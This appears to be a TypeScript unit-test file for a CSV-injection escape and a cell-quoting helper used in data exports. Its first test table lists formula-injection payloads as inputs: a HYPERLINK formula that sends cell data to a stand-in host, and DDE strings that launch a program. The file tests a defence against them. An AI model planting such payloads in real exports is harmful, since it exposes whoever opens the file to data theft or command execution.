/**
 * The shared CSV-injection escape and the cell funnel built on it.
 *
 * This is the last thing standing between a visitor-typed string and code
 * execution on the customer's laptop when they open the download, so it is
 * tested against the whole OWASP trigger list rather than the `=` everyone
 * remembers. The tests proving each export actually *calls* it live next to
 * that export (`leadsCsv.test.ts`, `features/feedback/feedback-helpers.test.ts`).
 */
import { describe, expect, it } from 'vitest';

import { csvField, csvSafe } from './csvSafe';

const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'] as const;

describe('csvSafe', () => {
  it.each([
    ['=HYPERLINK("https://evil.test/?"&A1,"Click")', 'formula'],
    ['+cmd|" /C calc"!A0', 'signed expression / DDE'],
    ['-2+3+cmd|" /C calc"!A0', 'signed expression / DDE'],
    ["@SUM(1+1)*cmd|' /C calc'!A0", 'legacy Lotus-style formula'],
    // Excel strips a leading TAB/CR before deciding whether the cell is a
    // formula, so a check that only looks for '=' misses these two.
    ['\t=1+1', 'TAB-prefixed formula'],
    ['\r=1+1', 'CR-prefixed formula'],
  ])('neutralises %j (%s)', (payload, why) => {
    const escaped = csvSafe(payload);

    // The defence: a leading single quote, so the spreadsheet reads the rest
    // of the cell as literal text rather than as an expression.
    expect(escaped, why).toBe(`'${payload}`);
    expect(TRIGGERS.some((t) => escaped.startsWith(t))).toBe(false);
    // Nothing is silently dropped, the value stays fully recoverable.
    expect(escaped.slice(1)).toBe(payload);
  });

  it('acts on every character in the trigger list', () => {
    /* Guards against the list being widened for documentation value while the
       escape silently keeps using a narrower rule. */
    for (const trigger of TRIGGERS) {
      expect(csvSafe(`${trigger}payload`)).toBe(`'${trigger}payload`);
    }
  });

  it.each(['Priya Sharma', 'Acme, Inc. "Main"', '', 'Café ☕', '2026 lead', 'priya@infosys.com'])(
    'leaves %j alone',
    (value) => {
      /* The escape is targeted. Commas and quotes are the CSV writer's job.
         `priya@infosys.com` is the case worth naming: the trigger is a
         *leading* '@', so an ordinary email must survive untouched or every
         lead export grows a stray quote. */
      expect(csvSafe(value)).toBe(value);
    },
  );

  it('only looks at the leading position', () => {
    // A trigger further into the string is inert. Excel decides at cell start.
    expect(csvSafe('Budget is =1+1 per seat')).toBe('Budget is =1+1 per seat');
  });

  it('does not stack quotes when applied twice', () => {
    const once = csvSafe('=1+1');
    expect(csvSafe(once)).toBe(once);
  });

  it('escapes an E.164 phone number, which is intended', () => {
    /* Pinned so nobody "fixes" it later. '+91 98000 00000' starts with '+', so
       it picks up a quote like any other triggering cell. Exempting values that
       "look like" a phone number is not an option ('+1+1' looks exactly as
       numeric as '+91') and every published bypass of this defence lives in
       precisely that kind of heuristic. Matches `csv_safe` on the backend. */
    expect(csvSafe('+91 98000 00000')).toBe("'+91 98000 00000");
  });
});

/**
 * The cell funnel every export routes through.
 *
 * It was written twice. Once in `leadsCsv.ts`, once in the feedback helpers,
 * and the two had already drifted on their signatures before being merged back
 * into this one. These pin the wider behaviour that survived, because that is
 * the part a future edit can silently drop: the escaping half is loudly covered
 * above, but "an absent field exports as an empty cell" is the kind of thing
 * that fails quietly, in a spreadsheet, on someone else's machine.
 */
describe('csvField', () => {
  it('quotes the cell and doubles an embedded quote', () => {
    expect(csvField('Acme, Inc. "Main"')).toBe('"Acme, Inc. ""Main"""');
  });

  it('applies the injection escape inside the quotes', () => {
    /* Both defences on one cell. The quoting does not stand in for the escape:
       Excel evaluates `"=1+1"` exactly as it evaluates `=1+1`. */
    expect(csvField('=1+1')).toBe('"\'=1+1"');
  });

  it.each([null, undefined])('exports %j as an empty cell', (value) => {
    /* Every optional contact field is `string | undefined`, and a CRM reading
       the file has to see absence as an empty cell rather than the literal text
       "undefined". */
    expect(csvField(value)).toBe('""');
  });

  it('keeps a numeric zero, rather than treating it as absent', () => {
    /* The nullish check is written out rather than as `value || ''` for exactly
       this: a lead with a score of 0 must export as 0, not as a blank cell. */
    expect(csvField(0)).toBe('"0"');
    expect(csvField(87)).toBe('"87"');
  });
});
